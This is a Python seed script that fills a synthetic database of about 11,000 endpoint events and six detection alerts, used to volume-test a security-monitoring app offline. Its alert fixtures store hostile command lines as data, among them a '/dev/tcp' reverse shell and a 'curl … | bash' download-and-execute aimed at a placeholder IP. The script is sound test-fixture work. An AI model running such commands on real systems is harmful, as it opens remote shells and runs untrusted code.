#!/usr/bin/env python3
"""Seed a deterministic ~11k-event volume DB for the air-gap offline proof.

The in-process air-gap gates and the e2e gates always ran against a tiny
seeded DB — a handful of events. That proves the guarantee works, but not
that it holds at *production volume*: a 10k+ event store is exactly where a
hidden external fetch (or a pathological whole-store query) would surface as
a slow page or a hang. This script builds a synthetic store at that scale so
the containerized bundle (--network none) and local runs can prove the
guarantee against real volume.

The schema is created by the app itself (app.core.db.init_db), so the rows
below are guaranteed to match the app's real columns — the seed can never
drift from what the backend actually reads. Rows are inserted directly
(fast, deterministic — random.Random(42)), not through the API: the API path
is already exercised end to end by seed_sweep_live.py and both e2e gates.

The volume run is clearly synthetic but deliberately *not* hidden by the
webapp's synthetic filters: source='live', a distinct host_id, a recent 6h
timestamp spread (so default 24h/7d windows cover it), and a realistic
event-type mix (network-heavy, plus process/file/registry rows) mirroring
the real soak store's proportions.

Usage:
  DATABASE_PATH=/tmp/volume.db .venv/bin/python scripts/seed_volume.py [--events 11000]
"""

import argparse
import json
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "backend"))

from app.core import config  # noqa: E402
from app.core.db import get_connection, init_db  # noqa: E402

RUN_ID = "vol-000000000001"  # deterministic, clearly synthetic
HOST_ID = "volume-host-01"

# Process table: a coherent tree the process-map and tree builders can walk.
PROCS = [
    # (pid, ppid, name, cmdline, exe)
    (1, 0, "systemd", "/sbin/init", "/usr/lib/systemd/systemd"),
    (400, 1, "sshd", "/usr/sbin/sshd -D", "/usr/sbin/sshd"),
    (401, 400, "sshd", "sshd: user [priv]", "/usr/sbin/sshd"),
    (402, 401, "bash", "-bash", "/usr/bin/bash"),
    (410, 402, "ssh", "ssh -p 22 user@10.0.0.4", "/usr/bin/ssh"),
    (500, 1, "gnome-shell", "/usr/bin/gnome-shell", "/usr/bin/gnome-shell"),
    (501, 500, "chrome", "/usr/bin/google-chrome --no-sandbox", "/opt/google/chrome/chrome"),
    (502, 501, "chrome", "chrome --type=renderer", "/opt/google/chrome/chrome"),
    (503, 501, "chrome", "chrome --type=gpu-process", "/opt/google/chrome/chrome"),
    (510, 500, "firefox", "/usr/bin/firefox", "/usr/bin/firefox"),
    (520, 500, "code", "/usr/share/code/code --no-sandbox", "/usr/share/code/code"),
    (521, 520, "node", "node /usr/share/code/out/vs/server/main.js", "/usr/bin/node"),
    (600, 1, "cron", "/usr/sbin/cron -f", "/usr/sbin/cron"),
    (601, 600, "sh", "/bin/sh -c run-parts /etc/cron.daily", "/bin/sh"),
    (602, 601, "apt", "/usr/bin/apt-get -qq update", "/usr/bin/apt"),
    (700, 1, "python3", "/usr/bin/python3 /opt/agent/agent.py", "/usr/bin/python3"),
    (701, 700, "python3", "/usr/bin/python3 /opt/agent/worker.py", "/usr/bin/python3"),
    (800, 1, "nginx", "/usr/sbin/nginx -g daemon on;", "/usr/sbin/nginx"),
    (801, 800, "nginx", "nginx: worker process", "/usr/sbin/nginx"),
    (900, 1, "dockerd", "/usr/bin/dockerd", "/usr/bin/dockerd"),
    (901, 900, "containerd", "/usr/bin/containerd", "/usr/bin/containerd"),
]

# Benign destinations (browsing, DNS, CDNs, internal) — the volume noise.
BENIGN_IPS = [
    "8.8.8.8", "1.1.1.1", "151.101.1.69", "151.101.65.69", "172.217.12.4",
    "142.250.72.14", "104.16.132.229", "104.18.23.10", "140.82.112.3",
    "185.199.108.153", "13.107.42.14", "23.52.16.10", "10.0.0.4", "10.0.0.5",
    "192.168.1.1", "192.168.1.20",
]
# Flagged destinations — enrichment/cache paths have something to chew on.
FLAGGED_IPS = ["203.0.113.88", "45.155.205.233", "185.220.101.34"]


def iso(dt: datetime) -> str:
    return dt.isoformat().replace("+00:00", "Z")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--events", type=int, default=11000)
    ap.add_argument("--out", default=None, help="overrides DATABASE_PATH")
    args = ap.parse_args()

    out = Path(args.out or config.DATABASE_PATH)
    out.parent.mkdir(parents=True, exist_ok=True)
    config.DATABASE_PATH = str(out)  # db.py reads this lazily per call

    init_db()
    conn = get_connection()

    rng = random.Random(42)
    now = datetime.now(timezone.utc)
    start = now - timedelta(hours=6)

    conn.execute(
        "INSERT INTO runs (run_id, sample_name, platform, session_type, "
        "source, started_at, completed_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
        (RUN_ID, "volume-baseline-11k", "linux", "live", "live",
         iso(start), iso(now)),
    )

    n = args.events
    rows: list[tuple] = []
    # Proportional mix mirroring the real soak store (network-heavy).
    counts = {
        "network_connection": int(n * 0.60),
        "process_create": int(n * 0.20),
        "file_write": int(n * 0.14),
        "registry_write": int(n * 0.06),
    }
    # Pad rounding drift on file_write.
    counts["file_write"] += n - sum(counts.values())

    pid_map = {p[0]: p for p in PROCS}

    for kind, total in counts.items():
        for i in range(total):
            ts = start + timedelta(seconds=(i / max(total, 1)) * 6 * 3600)
            pid, ppid, name, cmd, exe = rng.choice(PROCS)
            if kind == "network_connection":
                ip = rng.choice(BENIGN_IPS) if rng.random() < 0.97 else rng.choice(FLAGGED_IPS)
                port = 443 if rng.random() < 0.8 else (53 if rng.random() < 0.8 else rng.choice([80, 22, 4444]))
                rows.append((RUN_ID, "linux", kind, iso(ts), pid, ppid, name, cmd,
                             ip, port, "TCP", None, None, HOST_ID, None, "auditd", None, None, exe))
            elif kind == "process_create":
                rows.append((RUN_ID, "linux", kind, iso(ts), pid, ppid, name, cmd,
                             None, None, None, None, None, HOST_ID, None, "auditd", None, None, exe))
            elif kind == "file_write":
                path = f"/tmp/vol-{rng.randint(0, 99)}/{rng.randint(0, 999)}.log" if rng.random() < 0.9 else f"/var/log/{name}.log"
                rows.append((RUN_ID, "linux", kind, iso(ts), pid, ppid, name, cmd,
                             None, None, None, path, None, HOST_ID, None, "auditd", None, None, exe))
            else:  # registry_write
                rows.append((RUN_ID, "linux", kind, iso(ts), pid, ppid, name, cmd,
                             None, None, None, None, f"HKLM\\SOFTWARE\\Vol\\{rng.randint(0, 99)}", HOST_ID, None, "auditd", None, None, exe))

    conn.executemany(
        "INSERT INTO events (run_id, platform, event_type, timestamp, pid, ppid, "
        "process_name, command_line, dest_ip, dest_port, protocol, file_path, "
        "registry_key, host_id, raw_record, log_source, query, tls_sni, exe_path) "
        "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
        rows,
    )

    # A modest alert set across the rule families — some open (triage queue),
    # the rest resolved, so every alert-status surface has volume.
    alerts = [
        ("beaconing-c2", "Beaconing C2 traffic", "malicious", 402, "203.0.113.88",
         {"interval_ms": 2100, "hits": 12, "dest": "203.0.113.88:4444"}),
        ("reverse-shell", "Reverse shell (LOLBin)", "malicious", 402, "203.0.113.88",
         {"shell": "/dev/tcp/203.0.113.88/4444", "parent": "bash"}),
        ("curl-pipe-bash", "curl|bash download-exec", "suspicious", 501, None,
         {"cmd": "curl -s http://203.0.113.88/x.sh | bash"}),
        ("network-scan", "Network scan (fan-out)", "suspicious", 501, None,
         {"dests": 24, "window_s": 60}),
        ("enumeration-burst", "Recon enumeration burst", "suspicious", 501, None,
         {"commands": ["whoami", "uname -a", "getent passwd", "ss -tulpn"]}),
        ("scheduled-task", "Scheduled-task persistence", "suspicious", 600, None,
         {"path": "/etc/cron.d/vol"}),
    ]
    statuses = ["open", "open", "open", "acknowledged", "resolved", "resolved"]
    alert_rows = []
    for i, (rid, rname, sev, pid, ip, det) in enumerate(alerts):
        ts = start + timedelta(minutes=30 + i * 45)
        alert_rows.append((
            RUN_ID, rid, rname, sev, iso(ts), pid, ip, None,
            json.dumps({"rule": rid, "details": det}),
            statuses[i % len(statuses)],
            "seen in volume seed" if statuses[i % len(statuses)] != "open" else None,
            iso(ts + timedelta(minutes=5)) if statuses[i % len(statuses)] != "open" else None,
            None,
        ))
    conn.executemany(
        "INSERT INTO alerts (run_id, rule_id, rule_name, severity, triggered_at, "
        "related_pid, related_ip, related_pids, details, status, status_comment, "
        "status_at, assignee) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
        alert_rows,
    )

    # Warm process-map row (mirrors the write-through cache on completion).
    conn.execute(
        "INSERT INTO run_process_maps (run_id, last_event_id, pids_json, updated_at) "
        "VALUES (?, ?, ?, ?)",
        (RUN_ID, n, json.dumps({p[0]: {"ppid": p[1], "name": p[2], "exe": p[4]} for p in PROCS}), iso(now)),
    )
    conn.commit()
    conn.close()

    print(f"volume DB seeded: {out}")
    print(f"  events={n} runs=1 alerts={len(alert_rows)} procs={len(PROCS)} "
          f"host={HOST_ID} spread=6h (all within default 24h/7d windows)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
